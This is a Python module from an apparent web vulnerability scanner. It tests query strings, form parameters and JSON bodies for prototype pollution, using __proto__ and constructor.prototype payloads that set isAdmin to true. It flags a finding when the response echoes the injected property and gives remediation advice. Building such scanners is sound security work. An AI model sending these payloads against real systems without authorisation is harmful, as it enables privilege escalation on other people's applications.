#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
ATOMIC FRAMEWORK - Prototype Pollution Module
Detects JavaScript prototype pollution via __proto__ and constructor.prototype
injection in HTTP parameters and JSON bodies.
"""

from config import Payloads, Colors


class ProtoPollutionModule:
    """Prototype Pollution Testing Module"""

    name = "Prototype Pollution"
    vuln_type = "proto_pollution"

    def __init__(self, engine):
        self.engine = engine
        self.requester = engine.requester
        self.verbose = engine.config.get("verbose", False)

    def test(self, url: str, method: str, param: str, value: str):
        """Test a parameter for prototype pollution.

        Sends __proto__ and constructor payloads via query/body params and
        checks whether the injected property surfaces in the response.
        """
        for payload in Payloads.PROTO_POLLUTION:
            try:
                response = self.requester.request(
                    url,
                    method,
                    params={param: payload},
                )
                if not response:
                    continue
                body = response.text or ""
                if self._is_polluted(body, payload):
                    from core.engine import Finding

                    finding = Finding(
                        technique="Prototype Pollution",
                        url=url,
                        param=param,
                        payload=payload[:200],
                        evidence=body[:200],
                        severity="HIGH",
                        confidence=0.75,
                        mitre_id="T1059",
                        cwe_id="CWE-1321",
                        cvss=7.3,
                        remediation="Sanitize user input before merging into objects. Use Object.create(null) or Map instead of plain objects. Freeze Object.prototype.",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception as e:
                if self.verbose:
                    print(f"{Colors.error(f'Prototype Pollution test error: {e}')}")

        # Also try JSON body payloads for POST endpoints
        if method.upper() in ("POST", "PUT", "PATCH"):
            self._test_json_body(url, method)

    def test_url(self, url: str):
        """URL-level prototype pollution test (query string injection)."""
        qs_payloads = [
            "__proto__[isAdmin]=true",
            "__proto__.isAdmin=true",
            "constructor[prototype][isAdmin]=true",
        ]
        for payload in qs_payloads:
            try:
                test_url = url.rstrip("/") + "?" + payload
                response = self.requester.request(test_url, "GET")
                if not response:
                    continue
                body = response.text or ""
                if '"isAdmin":true' in body or '"isAdmin": true' in body:
                    from core.engine import Finding

                    finding = Finding(
                        technique="Prototype Pollution (Query String)",
                        url=test_url,
                        param="__proto__",
                        payload=payload[:200],
                        evidence=body[:200],
                        severity="HIGH",
                        confidence=0.8,
                        mitre_id="T1059",
                        cwe_id="CWE-1321",
                        cvss=7.3,
                        remediation="Reject or strip __proto__ and constructor keys from query parameters. Use schema validation on incoming data.",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception as e:
                if self.verbose:
                    print(f"{Colors.error(f'Prototype Pollution URL test error: {e}')}")

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    def _test_json_body(self, url: str, method: str):
        """Send JSON prototype pollution payloads in the request body."""
        json_payloads = [
            '{"__proto__":{"isAdmin":true}}',
            '{"constructor":{"prototype":{"isAdmin":true}}}',
        ]
        for payload in json_payloads:
            try:
                response = self.requester.request(
                    url,
                    method,
                    headers={"Content-Type": "application/json"},
                    data=payload,
                )
                if not response:
                    continue
                body = response.text or ""
                if '"isAdmin":true' in body or '"isAdmin": true' in body:
                    from core.engine import Finding

                    finding = Finding(
                        technique="Prototype Pollution (JSON Body)",
                        url=url,
                        param="__proto__",
                        payload=payload[:200],
                        evidence=body[:200],
                        severity="HIGH",
                        confidence=0.8,
                        mitre_id="T1059",
                        cwe_id="CWE-1321",
                        cvss=7.3,
                        remediation="Sanitize JSON input. Strip __proto__ and constructor keys before object merging.",
                    )
                    self.engine.add_finding(finding)
                    return
            except Exception as e:
                if self.verbose:
                    print(f"{Colors.error(f'Prototype Pollution JSON test error: {e}')}")

    @staticmethod
    def _is_polluted(body: str, payload: str) -> bool:
        """Return True when response suggests successful pollution."""
        indicators = [
            '"isAdmin":true',
            '"isAdmin": true',
            "isAdmin=true",
            '"admin":true',
        ]
        return any(ind in body for ind in indicators)
